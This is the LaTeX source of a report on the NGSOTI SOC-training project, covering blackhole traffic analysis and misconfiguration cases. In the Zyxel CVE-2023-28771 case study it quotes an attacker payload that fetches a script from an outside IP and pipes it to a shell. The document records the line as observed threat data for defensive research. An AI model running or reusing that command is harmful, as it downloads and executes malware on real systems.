% Chapter 1: Introduction
\chapter{Introduction}
The NGSOTI project is a collaborative effort aimed at enhancing the training infrastructure for SOC operators. Coordinated by CIRCL, the initiative involves partnerships with Restena, Tenzir, and the University of Luxembourg. The project began on January 1, 2024, and is scheduled to conclude on December 31, 2026, with a total budget of â‚¬1,477,349.00. CIRCL leads the effort as the project coordinator, with additional funding provided by the European Union.

NGSOTI's primary goal is to equip SOC operators with practical tools and methodologies to handle real-world incidents. It is set to to bridge the gap between theoretical knowledge and practical application, preparing operators for evolving threats through hands-on experience. By leveraging open-source technologies, the project seeks to create a training platform that emphasizes practical skills, ensuring operators are well-prepared for emerging cybersecurity challenges.

Moreover, the datasets created and collected throughout the lifespan of the project are currently being used and will continue to be used for research. The references to the datasets are published on the NGOSTI GitHub repository\footnote{\url{https://github.com/ngsoti/ngsoti/blob/main/datasets.md}}. Research activities could include the detection of new types of threats and modeling them to build predictive and preventive systems that will help SOC operators improve detection methods. An important aspect of NGSOTI data is that it consists of real data recorded in live mode.

This report is structured as follows: Chapter 2 revisits the project's objectives, Chapter 3 combines blackhole traffic analysis with key observations, and Chapter 4 presents real-world case studies derived from the blackhole data, and finally a conclusion in chapter 5.


% Chapter 2: Objectives
\chapter{Objectives}
The NGSOTI project aims to establish an open-source infrastructure tailored for SOC operator training. The infrastructure is designed to address key aspects of cybersecurity operations, including incident response which would equip operators with tools to swiftly detect and mitigate threats, as well as handling crisis situations; log management, which is essential for analyzing vast amounts of data recorded from multiples devices in a network, and take appropriate actions and SOC management processes to better streamline operational efficiency. Additionally, the project emphasizes communication for a better team coordination, documentation for an accurate reporting and swift handling of issues, and the integration of cyber threat intelligence (CTI) using tools like MISP, which provide actionable insights into emerging threats and would enable a better prevention when combined with other tools and sensors like the blackhole.

By employing technologies such as Suricata for intrusion detection, Zeek for detailed network logs, and Tenzir and parallel processing tools to handle large-scale security data, the project seeks to enhance intrusion detection and analysis capabilities. Tools like FlowIntel for case management and OpenNMS for monitoring are also integral to the training platform. Furthermore, the action incorporates MeliCERTes' Cerebrate tool, which improves collaboration and intelligence sharing across security communities ensuring a comprehensive approach to SOC training.


% Chapter 3: Blackhole Traffic Analysis
\chapter{Blackhole Traffic Analysis}


The project uses a methodical approach to analyze misconfigured systems by routing unused network ranges to a specific IP address for full packet capture. This setup allows for the collection of data on network activities that may indicate misconfigurations or malicious behavior. The captured data is streamed unidirectionally to a D4 collector, enabling a detailed analysis of the traffic.

The dataset analyzed during the project spans from January 1, 2024, to October 17, 2024, and includes over 10,226 unique destination IP addresses. In total, 4.31 TB of data was collected. This data provides invaluable insights into the nature of misconfigured devices and the patterns of malicious activities observed within the blackhole networks.

An evolution of the volume of the dataset is shown in figured \ref{countedpacket}. The figure shows a gap between May and June due to DNS issues on the sensor, which was unable to reach the collector. Several peaks were observed on 2024-07-01, 2024-08-27, and 2024-08-28.

\begin{figure}

    \caption{Collected IP packets over time}
    \label{countedpacket}
\end{figure}

Misconfigured devices are a recurring theme in the analysis. These misconfigurations often result from typographical errors or improper default routing setups. For instance, devices that send SYSLOG messages to unintended networks represent a common type of misconfiguration. Similarly, MikroTik routers are often observed connecting to external services, such as \texttt{cloud.mikrotik.com}, due to default configurations.

DNS misconfigurations are another significant finding. When a secondary DNS resolver is misconfigured, it frequently goes unnoticed, leading to unintended traffic redirection. These observations highlight the importance of proper configuration and monitoring practices to avoid exposing sensitive systems to potential threats.

\chapter{Example Cases}
\section{Mass Exploitation of Devices}
Mass exploitation campaigns are a critical concern in cybersecurity. Attackers often exploit known vulnerabilities as soon as they are disclosed.

Figure \ref{countedexploits} illustrates the evolution of exploits discovered over time in the dataset.

\begin{figure}
    \input{img/exploits.tex}
    \caption{Discovered Exploits}
    \label{countedexploits}
\end{figure}
% Chapter 4: Observations


A notable example observed during the project was the exploitation of the Zyxel router vulnerability (CVE-2023-28771), which allowed attackers to bypass authentication. The exploitation involved malicious payloads, such as the following command executed on vulnerable systems:
\begin{verbatim}
bash -c "curl http://92.60.77.85/z -o-|sh";
\end{verbatim}
This case underscores the need for timely patching and proactive defense mechanisms to mitigate the risks associated with known vulnerabilities.

\section{SYSLOG Misconfigurations}
Another observed issue was the improper configuration of SYSLOG services. Devices inappropriately sent SYSLOG messages to blackhole networks. For example, a SYSLOG message from a misconfigured firewall contained the following:
\begin{verbatim}
2024-10-01 12:49:18 IP x.x.196.218.45389 > x.x.x.x.514: SYSLOG local0.info
\end{verbatim}
This type of misconfiguration can result in the unintentional exposure of internal system information, creating vulnerabilities for exploitation.

The sample of keywords was extracted from the syslog message to derive the origine of the devices.

            \item scancode\_vpn
        \end{itemize}

\section{Intercom Systems and XML Messages}
Misconfigured intercom systems were also identified during the analysis. For example, an intercom system transmitted an XML-based message containing sensitive details, such as device serial numbers and IP addresses:
\begin{verbatim}
<videoIntercomMsg>
<header>
<method>1</method>
<action>1</action>
<from><deviceSN>Q05586499</deviceSN></from>
</header>
</videoIntercomMsg>
\end{verbatim}
Such exposures highlight the risks associated with improper device configuration and the potential for unauthorized access to sensitive systems.
